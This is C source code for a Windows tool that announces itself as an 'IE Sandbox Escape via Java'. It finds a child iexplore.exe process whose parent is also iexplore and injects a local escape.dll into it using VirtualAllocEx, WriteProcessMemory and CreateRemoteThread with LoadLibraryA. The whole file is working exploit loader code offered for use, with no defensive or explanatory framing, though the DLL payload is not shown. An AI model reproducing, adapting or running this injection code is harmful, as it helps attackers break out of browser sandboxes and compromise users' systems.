/************************************************************


************************************************************/
#include <windows.h> 
#include <stdio.h> 
#include <tlhelp32.h> 
#include <shlwapi.h> 

#define PROCESS_NAME "iexplore.exe" 
#define BUFSIZE MAX_PATH
char DLL_Name[BUFSIZE];
DWORD ProcID = 0;

//I could just use PROCESS_ALL_ACCESS but it's always best to use the absolute bare minimum of priveleges, so that your code works in as 
//many circumstances as possible. 
#define CREATE_THREAD_ACCESS (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ) 
  


BOOL InjectDLL(DWORD ProcessID, char *dllName); 
unsigned long GetTargetProcessIdFromProcname(char *procName); 

DWORD FindProc(char *procName) 
{ 
	DWORD ProcID = 0;

	//If not supplied on command line
	ProcID = GetTargetProcessIdFromProcname(procName); 

	if (ProcID ==0)
	{
		printf("- Process was not found\n");
		printf("- Injection failed\n"); 
		return FALSE;
	}

	return ProcID; 
} 



BOOL InjectDLL(DWORD ProcessID, char *dllName) 
{ 
   HANDLE Proc; 
   char buf[50]={0}; 
   LPVOID RemoteString, LoadLibAddy; 

   if(!ProcessID) 
      return FALSE; 

   printf("- Opening process\n");
   Proc = OpenProcess(CREATE_THREAD_ACCESS, FALSE, ProcessID); 

   if(!Proc) 
   { 
     printf("Failed to open process\n"); 
      return FALSE; 
   } 
   
   printf("- Starting remote thread\n",ProcID);
   LoadLibAddy = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA"); 

   RemoteString = (LPVOID)VirtualAllocEx(Proc, NULL, BUFSIZE, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE); 
   WriteProcessMemory(Proc, (LPVOID)RemoteString, dllName, BUFSIZE, NULL); 
   CreateRemoteThread(Proc, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddy, (LPVOID)RemoteString, NULL, NULL);    
    
   CloseHandle(Proc); 

   printf("- Done\n");

   return TRUE; 
} 

unsigned long CheckParent(DWORD PID,char *procName) 
{ 
   PROCESSENTRY32 pe; 
   HANDLE thSnapshot; 
   BOOL retval = FALSE; 
   HANDLE Proc; 

   thSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 

   if(thSnapshot == INVALID_HANDLE_VALUE) 
   { 
      printf("Failed to create snapshot\n"); 
      return FALSE; 
   } 

   pe.dwSize = sizeof(PROCESSENTRY32); 

   retval = Process32First(thSnapshot, &pe); 

   while(retval) 
   {
	  if(pe.th32ProcessID == PID)
      { 
         // Check name is iexplore
		printf("Checking %s\n",pe.szExeFile);
		if(StrStrI(pe.szExeFile, procName) ) 
		{
			return 1; 
			break; 
		} 

      } 

      retval    = Process32Next(thSnapshot,&pe); 
      pe.dwSize = sizeof(PROCESSENTRY32); 
   } 

   return 0;
} 


unsigned long GetTargetProcessIdFromProcname(char *procName) 
{ 
   PROCESSENTRY32 pe; 
   HANDLE thSnapshot; 
   BOOL retval = FALSE; 
   HANDLE Proc; 

   thSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 

   if(thSnapshot == INVALID_HANDLE_VALUE) 
   { 
      printf("Failed to create snapshot\n"); 
      return FALSE; 
   } 

   pe.dwSize = sizeof(PROCESSENTRY32); 

   retval = Process32First(thSnapshot, &pe); 

   while(retval) 
   { 
      if(StrStrI(pe.szExeFile, procName) ) 
      { 
		printf("Found %s\n",procName);

		// Check this is a child iexplore
		if(CheckParent(pe.th32ParentProcessID,procName))
		{

			 // Need to confirm we can open process on it
			Proc = OpenProcess(CREATE_THREAD_ACCESS, FALSE, pe.th32ProcessID); 

			if(Proc) 
			{ 

				CloseHandle(Proc);
				return pe.th32ProcessID; 
				break; 
			} 
			CloseHandle(Proc);
		}

      } 

      retval    = Process32Next(thSnapshot,&pe); 
      pe.dwSize = sizeof(PROCESSENTRY32); 
   } 

   return 0;
} 


int main(int argc,char *argv[]) 
{ 

	printf("IE Sandbox Escape via Java\n");

	// Name of DLL
	GetCurrentDirectory(BUFSIZE, DLL_Name);
	strcat(DLL_Name,"\\escape.dll");
	

	ProcID = FindProc(PROCESS_NAME);
	if (ProcID > 0)
	{
		printf("- Injecting to PID %d\n",ProcID);
		if(!(InjectDLL(ProcID, DLL_Name)))
		{
			printf("- Injection failed\n"); 
			return 0; 
		}

	}
		
	
	return 0; 
	
} 